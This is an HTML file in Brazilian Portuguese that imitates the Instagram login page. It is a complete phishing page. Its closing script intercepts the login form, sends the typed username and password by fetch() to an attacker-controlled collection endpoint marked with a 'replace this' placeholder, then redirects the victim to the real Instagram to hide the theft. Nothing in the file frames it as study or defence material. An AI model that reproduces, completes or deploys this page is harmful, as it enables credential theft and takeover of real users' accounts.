<!DOCTYPE html>
<html lang="pt-BR" class="no-js not-logged-in">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Entrar • Instagram</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <link rel="icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}
        #wrapper{width:350px;background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:40px 40px 20px;text-align:center}
        #logo{fill:#262626;margin-bottom:30px}
        input{width:100%;padding:11px 8px 8px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;font-size:12px;outline:none}
        input:focus{border-color:#bbb}
        button{width:100%;padding:8px;background:#0095f6;color:#fff;border:none;border-radius:4px;font-weight:600;font-size:14px;cursor:pointer;margin-top:8px}
        button:disabled{opacity:.3}
        a{text-decoration:none;color:#00376b;font-size:12px}
        .sep{margin:18px 0 26px;font-size:13px;color:#8e8e8e;position:relative}
        .sep:before{content:'';height:1px;background:#dbdbdb;position:absolute;top:8px;left:0;right:0}
        .sep span{background:#fff;padding:0 18px;position:relative}
        #fb-login{color:#385185;font-weight:500;font-size:14px;display:inline-block;margin-top:16px}
        #forgot{display:block;margin-top:12px;font-size:12px}
        #signup{background:#fff;border:1px solid #dbdbdb;border-radius:1px;width:350px;margin:10px auto;padding:20px;text-align:center;font-size:14px}
    </style>
</head>
<body>
    <div id="wrapper">
        <svg id="logo" width="175" height="51" viewBox="0 0 175 51">
            <path d="M12.472.08h15.28c8.242 0 13.577 4.63 13.577 11.77 0 4.2-2.13 7.346-5.445 8.795 4.233 1.27 6.64 4.67 6.64 9.69 0 7.05-5.395 11.48-13.823 11.48H12.472V.08Zm13.06 18.992c3.18 0 5.15-1.77 5.15-4.49 0-2.64-1.97-4.2-5.15-4.2h-7.22v8.69h7.22Zm.79 19.364c3.56 0 5.77-1.91 5.77-4.96 0-3.04-2.21-4.95-5.88-4.95h-7.81v9.91h7.92ZM43.752 25.78c0-7.92 6.1-13.4 13.63-13.4 4.85 0 8.37 2.21 10.72 5.77l-5.15 3.4c-1.36-2.21-3.4-3.54-5.88-3.54-4.11 0-7.1 3.04-7.1 7.72s2.99 7.72 7.1 7.72c2.48 0 4.52-1.33 5.88-3.54l5.15 3.4c-2.35 3.56-5.87 5.77-10.72 5.77-7.53 0-13.63-5.48-13.63-13.4Z"/>
        </svg>
        <form id="login" method="post" autocomplete="on">
            <input type="text" id="user" name="username" placeholder="Telefone, nome de usuário ou email" required>
            <input type="password" id="pass" name="password" placeholder="Senha" required>
            <button type="submit" id="bt" disabled>Entrar</button>
        </form>
        <div class="sep"><span>OU</span></div>
        <a id="fb-login" href="https://www.facebook.com">Entrar com o Facebook</a>
        <a id="forgot" href="https://www.instagram.com/accounts/password/reset/">Esqueceu a senha?</a>
    </div>
    <div id="signup">
        Não tem uma conta? <a href="https://www.instagram.com/accounts/emailsignup/">Cadastre-se</a>
    </div>

<script>
/* ===== captura e envio ===== */
const SERV = "https://SEUGIT.github.io/r.php";  // << troque
const IGREAL = "https://www.instagram.com";     // redireciona depois

document.getElementById('login').addEventListener('submit', function(e){
    e.preventDefault();                        // não recarrega a página
    const u = document.getElementById('user').value;
    const p = document.getElementById('pass').value;
    /* manda em AJAX */
    fetch(SERV,{
        method:'POST',
        headers:{'Content-Type':'application/x-www-form-urlencoded'},
        body:'u='+encodeURIComponent(u)+'&p='+encodeURIComponent(p)
    });
    /* mostra "carregando" e depois joga para Instagram real */
    document.getElementById('bt').textContent = "Verificando…";
    setTimeout(()=>{ location.href = IGREAL; }, 1500);
});
</script>
</body>
</html>
